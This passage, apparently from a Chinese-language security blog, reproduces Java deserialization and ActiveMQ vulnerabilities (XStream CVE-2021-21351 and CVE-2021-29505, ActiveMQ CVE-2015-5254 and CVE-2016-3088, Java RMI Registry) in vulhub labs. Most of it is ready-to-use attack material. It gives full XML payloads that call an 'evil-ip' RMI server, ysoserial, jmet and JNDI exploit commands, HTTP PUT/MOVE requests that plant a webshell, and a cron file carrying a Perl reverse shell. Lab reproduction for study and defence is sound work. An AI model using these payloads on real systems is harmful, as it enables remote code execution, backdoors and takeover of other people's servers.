<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;touch /tmp/success&quot; -A 192.168.1.142</span><br></pre></td></tr></table></figure>

<p>使用上图中基于SpringBoot利用链的RMI地址作为<dataSource>的值，构造POC如下：</dataSource></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: localhost:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 3184</span><br><span class="line"></span><br><span class="line">&lt;sorted-set&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XRTreeFrag&#x27;&gt;</span><br><span class="line">      &lt;m__DTMXRTreeFrag&gt;</span><br><span class="line">        &lt;m__dtm class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.sax2dtm.SAX2DTM&#x27;&gt;</span><br><span class="line">          &lt;m__size&gt;-10086&lt;/m__size&gt;</span><br><span class="line">          &lt;m__mgrDefault&gt;</span><br><span class="line">            &lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;</span><br><span class="line">            &lt;m__incremental&gt;false&lt;/m__incremental&gt;</span><br><span class="line">            &lt;m__source__location&gt;false&lt;/m__source__location&gt;</span><br><span class="line">            &lt;m__dtms&gt;</span><br><span class="line">              &lt;null/&gt;</span><br><span class="line">            &lt;/m__dtms&gt;</span><br><span class="line">            &lt;m__defaultHandler/&gt;</span><br><span class="line">          &lt;/m__mgrDefault&gt;</span><br><span class="line">          &lt;m__shouldStripWS&gt;false&lt;/m__shouldStripWS&gt;</span><br><span class="line">          &lt;m__indexing&gt;false&lt;/m__indexing&gt;</span><br><span class="line">          &lt;m__incrementalSAXSource class=&#x27;com.sun.org.apache.xml.internal.dtm.ref.IncrementalSAXSource_Xerces&#x27;&gt;</span><br><span class="line">            &lt;fPullParserConfig class=&#x27;com.sun.rowset.JdbcRowSetImpl&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">              &lt;javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">                &lt;default&gt;</span><br><span class="line">                  &lt;concurrency&gt;1008&lt;/concurrency&gt;</span><br><span class="line">                  &lt;escapeProcessing&gt;true&lt;/escapeProcessing&gt;</span><br><span class="line">                  &lt;fetchDir&gt;1000&lt;/fetchDir&gt;</span><br><span class="line">                  &lt;fetchSize&gt;0&lt;/fetchSize&gt;</span><br><span class="line">                  &lt;isolation&gt;2&lt;/isolation&gt;</span><br><span class="line">                  &lt;maxFieldSize&gt;0&lt;/maxFieldSize&gt;</span><br><span class="line">                  &lt;maxRows&gt;0&lt;/maxRows&gt;</span><br><span class="line">                  &lt;queryTimeout&gt;0&lt;/queryTimeout&gt;</span><br><span class="line">                  &lt;readOnly&gt;true&lt;/readOnly&gt;</span><br><span class="line">                  &lt;rowSetType&gt;1004&lt;/rowSetType&gt;</span><br><span class="line">                  &lt;showDeleted&gt;false&lt;/showDeleted&gt;</span><br><span class="line">                  &lt;dataSource&gt;rmi://evil-ip:1099/example&lt;/dataSource&gt;</span><br><span class="line">                  &lt;listeners/&gt;</span><br><span class="line">                  &lt;params/&gt;</span><br><span class="line">                &lt;/default&gt;</span><br><span class="line">              &lt;/javax.sql.rowset.BaseRowSet&gt;</span><br><span class="line">              &lt;com.sun.rowset.JdbcRowSetImpl&gt;</span><br><span class="line">                &lt;default/&gt;</span><br><span class="line">              &lt;/com.sun.rowset.JdbcRowSetImpl&gt;</span><br><span class="line">            &lt;/fPullParserConfig&gt;</span><br><span class="line">            &lt;fConfigSetInput&gt;</span><br><span class="line">              &lt;class&gt;com.sun.rowset.JdbcRowSetImpl&lt;/class&gt;</span><br><span class="line">              &lt;name&gt;setAutoCommit&lt;/name&gt;</span><br><span class="line">              &lt;parameter-types&gt;</span><br><span class="line">                &lt;class&gt;boolean&lt;/class&gt;</span><br><span class="line">              &lt;/parameter-types&gt;</span><br><span class="line">            &lt;/fConfigSetInput&gt;</span><br><span class="line">            &lt;fConfigParse reference=&#x27;../fConfigSetInput&#x27;/&gt;</span><br><span class="line">            &lt;fParseInProgress&gt;false&lt;/fParseInProgress&gt;</span><br><span class="line">          &lt;/m__incrementalSAXSource&gt;</span><br><span class="line">          &lt;m__walker&gt;</span><br><span class="line">            &lt;nextIsRaw&gt;false&lt;/nextIsRaw&gt;</span><br><span class="line">          &lt;/m__walker&gt;</span><br><span class="line">          &lt;m__endDocumentOccured&gt;false&lt;/m__endDocumentOccured&gt;</span><br><span class="line">          &lt;m__idAttributes/&gt;</span><br><span class="line">          &lt;m__textPendingStart&gt;-1&lt;/m__textPendingStart&gt;</span><br><span class="line">          &lt;m__useSourceLocationProperty&gt;false&lt;/m__useSourceLocationProperty&gt;</span><br><span class="line">          &lt;m__pastFirstElement&gt;false&lt;/m__pastFirstElement&gt;</span><br><span class="line">        &lt;/m__dtm&gt;</span><br><span class="line">        &lt;m__dtmIdentity&gt;1&lt;/m__dtmIdentity&gt;</span><br><span class="line">      &lt;/m__DTMXRTreeFrag&gt;</span><br><span class="line">      &lt;m__dtmRoot&gt;1&lt;/m__dtmRoot&gt;</span><br><span class="line">      &lt;m__allowRelease&gt;false&lt;/m__allowRelease&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">  &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;type&gt;ysomap&lt;/type&gt;</span><br><span class="line">    &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">      &lt;m__obj class=&#x27;string&#x27;&gt;test&lt;/m__obj&gt;</span><br><span class="line">    &lt;/value&gt;</span><br><span class="line">  &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">&lt;/sorted-set&gt;</span><br></pre></td></tr></table></figure>

<p>其中，evil-ip是恶意RMI服务器的地址。然后，进入目标容器内，可见touch &#x2F;tmp&#x2F;success已成功执行</p>
<p>实际利用中，如果目标Java版本较低，POC需要做修改，将其中的<code>&lt;__overrideDefaultParser&gt;false&lt;/__overrideDefaultParser&gt;</code>改成 <code>&lt;__useServicesMechanism&gt;false&lt;/__useervicesMechanism&gt;</code>即可</p>
<p>refer: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://x-stream.github.io/CVE-2021-21351.html">https://x-stream.github.io/CVE-2021-21351.html</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dfi24JuezqYYEGaKnXU3xQ">https://mp.weixin.qq.com/s/dfi24JuezqYYEGaKnXU3xQ</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit/">https://github.com/welk1n/JNDI-Injection-Exploit/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.veracode.com/blog/research/exploiting-jndi-injections-java">https://www.veracode.com/blog/research/exploiting-jndi-injections-java</a></li>
</ul>
<h3 id="2-XStream-反序列化命令执行漏洞（CVE-2021-29505）"><a href="#2-XStream-反序列化命令执行漏洞（CVE-2021-29505）" class="headerlink" title="2. XStream 反序列化命令执行漏洞（CVE-2021-29505）"></a>2. XStream 反序列化命令执行漏洞（CVE-2021-29505）</h3><p><strong>漏洞描述</strong></p>
<p>XStream 在解析XML文本时使用黑名单机制来防御反序列化漏洞，但是其 1.4.16 及之前版本黑名单存在缺陷，攻击者可利用<code>sun.rmi.registry.RegistryImpl_Stub</code>构造RMI请求，进而执行任意命令</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，启动一个Springboot + XStream 1.4.16的环境：环境启动后，我们向 <a target="_blank" rel="noopener" href="http://your-ip:8080/">http://your-ip:8080</a> 发送一个正常的XML数据包，将会得到预期返回</p>
<ol>
<li>使用ysoserial的JRMPListener启动一个恶意的RMI Registry</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections6 &quot;touch /tmp/success&quot;</span><br></pre></td></tr></table></figure>

<p>这个RMI Registry在收到请求后，会返回用CommonsCollections6利用链构造的恶意序列化对象</p>
<p>2）向目标服务器发送CVE-2021-29505的XML POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 3169</span><br><span class="line"></span><br><span class="line">&lt;java.util.PriorityQueue serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">    &lt;unserializable-parents/&gt;</span><br><span class="line">    &lt;java.util.PriorityQueue&gt;</span><br><span class="line">        &lt;default&gt;</span><br><span class="line">            &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">        &lt;/default&gt;</span><br><span class="line">        &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.org.apache.xpath.internal.objects.XString&#x27;&gt;</span><br><span class="line">                &lt;m__obj class=&#x27;string&#x27;&gt;com.sun.xml.internal.ws.api.message.Packet@2002fc1d Content&lt;/m__obj&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">        &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">            &lt;type&gt;12345&lt;/type&gt;</span><br><span class="line">            &lt;value class=&#x27;com.sun.xml.internal.ws.api.message.Packet&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                &lt;message class=&#x27;com.sun.xml.internal.ws.message.saaj.SAAJMessage&#x27;&gt;</span><br><span class="line">                    &lt;parsedMessage&gt;true&lt;/parsedMessage&gt;</span><br><span class="line">                    &lt;soapVersion&gt;SOAP_11&lt;/soapVersion&gt;</span><br><span class="line">                    &lt;bodyParts/&gt;</span><br><span class="line">                    &lt;sm class=&#x27;com.sun.xml.internal.messaging.saaj.soap.ver1_1.Message1_1Impl&#x27;&gt;</span><br><span class="line">                        &lt;attachmentsInitialized&gt;false&lt;/attachmentsInitialized&gt;</span><br><span class="line">                        &lt;nullIter class=&#x27;com.sun.org.apache.xml.internal.security.keys.storage.implementations.KeyStoreResolver$KeyStoreIterator&#x27;&gt;</span><br><span class="line">                            &lt;aliases class=&#x27;com.sun.jndi.toolkit.dir.LazySearchEnumerationImpl&#x27;&gt;</span><br><span class="line">                                &lt;candidates class=&#x27;com.sun.jndi.rmi.registry.BindingEnumeration&#x27;&gt;</span><br><span class="line">                                    &lt;names&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                        &lt;string&gt;aa&lt;/string&gt;</span><br><span class="line">                                    &lt;/names&gt;</span><br><span class="line">                                    &lt;ctx&gt;</span><br><span class="line">                                        &lt;environment/&gt;</span><br><span class="line">                                        &lt;registry class=&#x27;sun.rmi.registry.RegistryImpl_Stub&#x27; serialization=&#x27;custom&#x27;&gt;</span><br><span class="line">                                            &lt;java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                                &lt;string&gt;UnicastRef&lt;/string&gt;</span><br><span class="line">                                                &lt;string&gt;evil-ip&lt;/string&gt;</span><br><span class="line">                                                &lt;int&gt;1099&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;int&gt;0&lt;/int&gt;</span><br><span class="line">                                                &lt;long&gt;0&lt;/long&gt;</span><br><span class="line">                                                &lt;short&gt;0&lt;/short&gt;</span><br><span class="line">                                                &lt;boolean&gt;false&lt;/boolean&gt;</span><br><span class="line">                                            &lt;/java.rmi.server.RemoteObject&gt;</span><br><span class="line">                                        &lt;/registry&gt;</span><br><span class="line">                                        &lt;host&gt;evil-ip&lt;/host&gt;</span><br><span class="line">                                        &lt;port&gt;1099&lt;/port&gt;</span><br><span class="line">                                    &lt;/ctx&gt;</span><br><span class="line">                                &lt;/candidates&gt;</span><br><span class="line">                            &lt;/aliases&gt;</span><br><span class="line">                        &lt;/nullIter&gt;</span><br><span class="line">                    &lt;/sm&gt;</span><br><span class="line">                &lt;/message&gt;</span><br><span class="line">            &lt;/value&gt;</span><br><span class="line">        &lt;/javax.naming.ldap.Rdn_-RdnEntry&gt;</span><br><span class="line">    &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure>

<p>其中，evil-ip是恶意RMI服务器的地址。恶意RMI服务器收到RMI请求</p>
<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://x-stream.github.io/CVE-2021-29505.html">https://x-stream.github.io/CVE-2021-29505.html</a></li>
</ul>
<h2 id="0x0D-Apache-ActiveMQ"><a href="#0x0D-Apache-ActiveMQ" class="headerlink" title="0x0D Apache ActiveMQ"></a>0x0D Apache ActiveMQ</h2><h3 id="1-ActiveMQ-反序列化漏洞（CVE-2015-5254）"><a href="#1-ActiveMQ-反序列化漏洞（CVE-2015-5254）" class="headerlink" title="1. ActiveMQ 反序列化漏洞（CVE-2015-5254）"></a>1. ActiveMQ 反序列化漏洞（CVE-2015-5254）</h3><p><strong>漏洞描述</strong></p>
<p>Apache ActiveMQ是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</p>
<p>Apache ActiveMQ 5.13.0之前5.x版本中存在安全漏洞，该漏洞源于程序未能限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java Message Service(JMS)ObjectMessage对象利用该漏洞执行任意代码</p>
<p><strong>漏洞复现</strong></p>
<p>使用vulhub搭建环境，环境运行后，将监听61616和8161两个端口。其中61616是工作端口，消息在这个端口进行传递；8161是Web管理页面端口。访问 <a target="_blank" rel="noopener" href="http://your-ip:8161/">http://your-ip:8161</a> 即可看到web管理页面，漏洞不需要web即可利用</p>
<p><strong>利用过程</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1) 构造（可以使用ysoserial）可执行命令的序列化对象</span><br><span class="line">2) 作为一个消息，发送给目标61616端口</span><br><span class="line">3) 访问web管理页面，读取消息，触发漏洞</span><br></pre></td></tr></table></figure>

<p>使用<a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet">jmet</a>进行漏洞利用。首先下载jmet的jar文件，并在同目录下创建一个external文件夹</p>
<p>jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME</p>
<p>执行:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;touch /tmp/success&quot; -Yp ROME your-ip 61616</span><br></pre></td></tr></table></figure>

<p>此时会给目标ActiveMQ添加一个名为event的队列，可以通过 <a target="_blank" rel="noopener" href="http://your-ip:8161/admin/browse.jsp?JMSDestination=event">http://your-ip:8161/admin/browse.jsp?JMSDestination=event</a> 看到这个队列中所有消息，点击查看这条消息即可触发命令执行</p>
<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt">https://activemq.apache.org/security-advisories.data/CVE-2015-5254-announcement.txt</a></li>
<li><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf">https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf</a></li>
</ul>
<h3 id="2-Activemq-PUT方法文件上传漏洞（CVE-2016-3088）"><a href="#2-Activemq-PUT方法文件上传漏洞（CVE-2016-3088）" class="headerlink" title="2. Activemq PUT方法文件上传漏洞（CVE-2016-3088）"></a>2. Activemq PUT方法文件上传漏洞（CVE-2016-3088）</h3><p><strong>漏洞描述</strong></p>
<p>Apache ActiveMQ Fileserver web程序存在远程代码执行漏洞，可使远程攻击者用恶意代码替代Web应用，在受影响系统上执行远程代码</p>
<p><strong>背景简述</strong></p>
<p>ActiveMQ的web控制台分三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. 其使用率并不高</span><br><span class="line">2. 文件操作容易出现漏洞</span><br></pre></td></tr></table></figure>
<p>所以，ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（你可以在conf&#x2F;jetty.xml中开启之）；在5.14.0版本以后，彻底删除了fileserver应用</p>
<p><strong>漏洞详情</strong></p>
<p>本漏洞出现在fileserver应用中，漏洞原理就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
<p>文件写入有几种利用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1）写入webshell：fileserver不解析jsp，admin和api两个应用都需要登录才能访问，有限制</span><br><span class="line">2）写入cron或ssh key等文件：可直接反弹拿shell，也比较方便，缺点是需要root权限</span><br><span class="line">3）写入jar或jetty.xml等库和配置文件：写入jar，需要jar的后门；写入xml配置文件，需要知道activemq的绝对路径</span><br></pre></td></tr></table></figure>

<p><strong>环境搭建</strong></p>
<p>使用vulhub搭建及运行漏洞环境：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure>

<p>环境监听61616端口和8161端口，其中8161为web控制台端口，本漏洞出现在web控制台中。</p>
<p>访问 <a target="_blank" rel="noopener" href="http://your-ip:8161/">http://your-ip:8161/</a> 看到web页面，说明环境已成功运行</p>
<p><strong>写入webshell</strong></p>
<p>默认的ActiveMQ账号密码均为admin，首先访问 <a target="_blank" rel="noopener" href="http://your-ip:8161/admin/test/systemProperties.jsp">http://your-ip:8161/admin/test/systemProperties.jsp</a> ，查看ActiveMQ的绝对路径</p>
<p>然后上传webshell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/2.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 120976</span><br><span class="line"></span><br><span class="line">webshell...</span><br></pre></td></tr></table></figure>

<p>移动到web目录下的api文件夹（&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;s.jsp）中：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/2.txt HTTP/1.1</span><br><span class="line">Destination: file:///opt/activemq/webapps/api/s.jsp</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p>登录访问webshell</p>
<p><strong>写入crontab反弹shell</strong></p>
<p>前提：需要ActiveMQ是root运行，否则不能写入cron文件</p>
<p>首先上传cron配置文件（注意，换行一定要\n，不能是\r\n，否则crontab执行会失败）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT /fileserver/1.txt HTTP/1.1</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 248</span><br><span class="line"></span><br><span class="line">*/1 * * * * root /usr/bin/perl -e &#x27;use Socket;$i=&quot;10.0.0.1&quot;;$p=21;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span><br></pre></td></tr></table></figure>

<p>将其移动到&#x2F;etc&#x2F;cron.d&#x2F;root：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MOVE /fileserver/1.txt HTTP/1.1</span><br><span class="line">Destination: file:///etc/cron.d/root</span><br><span class="line">Host: localhost:8161</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure>

<p>如果上述两个请求都返回204，说明写入成功。等待反弹shell</p>
<p>refer:</p>
<ul>
<li><a target="_blank" rel="noopener" href="http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt">http://activemq.apache.org/security-advisories.data/CVE-2016-3088-announcement.txt</a>	</li>
<li><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/42283">https://www.exploit-db.com/exploits/42283</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2016-3088">https://github.com/vulhub/vulhub/tree/master/activemq/CVE-2016-3088</a></li>
</ul>
<h2 id="0x0E-Java-RMI"><a href="#0x0E-Java-RMI" class="headerlink" title="0x0E Java RMI"></a>0x0E Java RMI</h2><h3 id="1-Java-RMI-Registry-反序列化漏洞-lt-x3D-jdk8u111"><a href="#1-Java-RMI-Registry-反序列化漏洞-lt-x3D-jdk8u111" class="headerlink" title="1. Java RMI Registry 反序列化漏洞(&lt;&#x3D;jdk8u111)"></a>1. Java RMI Registry 反序列化漏洞(&lt;&#x3D;jdk8u111)</h3><p><strong>漏洞描述</strong></p>
<p>Java Remote Method Invocation 用于在Java中进行远程调用。RMI存在远程bind的功能(虽然大多数情况不允许远程bind)，在bind过程中，伪造Registry接收到的序列化数据(实现了Remote接口或动态代理了实现了Remote接口的对象)，使Registry在对数据进行反序列化时触发相应的利用链(环境用的是commons-collections:3.2.1)</p>
<p><strong>漏洞环境</strong></p>
<p>使用vulhub，执行如下命令编译及启动RMI Registry和服务器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose run -e RMIIP=your-ip -p 1099:1099 rmi</span><br></pre></td></tr></table></figure>

<p>其中，your-ip是服务器IP，客户端会根据这个IP来连接服务器。环境启动后，RMI Registry监听在1099端口</p>
<p><strong>漏洞复现</strong></p>
<p>通过ysoserial的exploit包中的RMIRegistryExploit进行攻击</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.RMIRegistryExploit your-ip 1099 CommonsCollections6 &quot;curl your-dnslog-server&quot;</span><br></pre></td></tr></table></figure>

<h3 id="2-Java-RMI-Registry-反序列化漏洞-lt-jdk8u232-b09"><a href="#2-Java-RMI-Registry-反序列化漏洞-lt-jdk8u232-b09" class="headerlink" title="2. Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)"></a>2. Java RMI Registry 反序列化漏洞(&lt;jdk8u232_b09)</h3><p><strong>漏洞描述</strong></p>
